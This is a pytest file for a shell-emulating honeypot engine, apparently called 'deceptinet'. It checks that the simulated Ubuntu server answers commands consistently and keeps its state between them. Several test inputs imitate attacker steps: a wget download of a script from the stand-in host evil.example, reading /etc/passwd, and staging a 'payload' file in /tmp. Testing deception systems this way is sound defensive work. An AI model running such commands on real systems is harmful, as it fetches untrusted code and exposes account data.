"""Vanilla engine behaviour — the Phase 1 baseline must be solid and fair."""

from __future__ import annotations

import pytest

from deceptinet.engine.vanilla import VanillaEngine
from deceptinet.session.state import build_session_state

pytestmark = pytest.mark.asyncio


@pytest.fixture
def engine():
    return VanillaEngine()


@pytest.fixture
def state():
    return build_session_state("ubuntu-22.04-webserver", "root")


async def run(engine, state, line):
    return await engine.respond(line, state)


async def test_whoami(engine, state):
    r = await run(engine, state, "whoami")
    assert r.output == "root\n"
    assert r.exit_status == 0


async def test_uname_a(engine, state):
    r = await run(engine, state, "uname -a")
    assert "Linux web-prod-01 5.15.0-89-generic" in r.output
    assert "x86_64" in r.output


async def test_cat_etc_passwd(engine, state):
    r = await run(engine, state, "cat /etc/passwd")
    assert "root:x:0:0:root:/root:/bin/bash" in r.output


async def test_cd_and_pwd_persist(engine, state):
    await run(engine, state, "cd /etc")
    r = await run(engine, state, "pwd")
    assert r.output == "/etc\n"


async def test_cd_nonexistent(engine, state):
    r = await run(engine, state, "cd /no/such/dir")
    assert "No such file or directory" in r.output
    assert r.exit_status == 1


async def test_mkdir_then_ls_shows_it(engine, state):
    await run(engine, state, "mkdir loot")
    r = await run(engine, state, "ls")
    assert "loot" in r.output


async def test_state_consistency_across_commands(engine, state):
    # The core Phase 1 requirement: create -> later observe.
    await run(engine, state, "mkdir /tmp/stage")
    await run(engine, state, "echo payload > /tmp/stage/x.sh")
    r = await run(engine, state, "cat /tmp/stage/x.sh")
    assert r.output == "payload\n"
    r2 = await run(engine, state, "ls /tmp/stage")
    assert "x.sh" in r2.output


async def test_rm_then_gone(engine, state):
    await run(engine, state, "echo a > /tmp/del.txt")
    await run(engine, state, "rm /tmp/del.txt")
    r = await run(engine, state, "cat /tmp/del.txt")
    assert "No such file or directory" in r.output


async def test_unknown_command_is_honest(engine, state):
    r = await run(engine, state, "definitelynotacommand --flag")
    assert r.output == "definitelynotacommand: command not found\n"
    assert r.exit_status == 127
    assert r.meta.get("unknown_command") == "definitelynotacommand"


async def test_sequencing_and_short_circuit(engine, state):
    # `false-ish` unknown command exits 127, so && should short-circuit.
    r = await run(engine, state, "nope && echo SHOULD_NOT_PRINT")
    assert "SHOULD_NOT_PRINT" not in r.output
    # `;` always runs the next command.
    r2 = await run(engine, state, "nope ; echo RUNS")
    assert "RUNS" in r2.output


async def test_exit_closes_session(engine, state):
    r = await run(engine, state, "exit")
    assert r.close_session is True


async def test_wget_does_not_fetch(engine, state):
    r = await run(engine, state, "wget http://evil.example/m.sh")
    # No real fetch; response is inert and does not claim success.
    assert "unable to resolve host" in r.output
    assert r.exit_status != 0


async def test_latency_recorded(engine, state):
    r = await run(engine, state, "whoami")
    assert r.latency_ms is not None and r.latency_ms >= 0
    assert r.engine_mode == "vanilla"


async def test_pipe_marked_unhandled(engine, state):
    r = await run(engine, state, "cat /etc/passwd | grep root")
    # Left side runs; we honestly record that the pipe was not interpreted.
    assert "root" in r.output
    assert r.meta.get("pipe_unhandled") is True
